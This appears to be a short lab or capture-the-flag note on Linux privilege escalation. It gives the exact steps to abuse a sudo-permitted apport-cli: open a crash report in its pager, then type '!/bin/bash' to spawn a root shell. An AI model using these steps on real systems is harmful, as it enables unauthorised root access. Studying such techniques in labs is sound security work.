### privesc
- `sudo -l`
- `sudo /usr/bin/apport-cli -c dummy.crash` then select the `V: View Report`
- it will open a `pager`, similar to what you'll see when you reading a file using `less`
- it can then execute commands like those in `vim`
- type `!/bin/bash` to spawn shell as root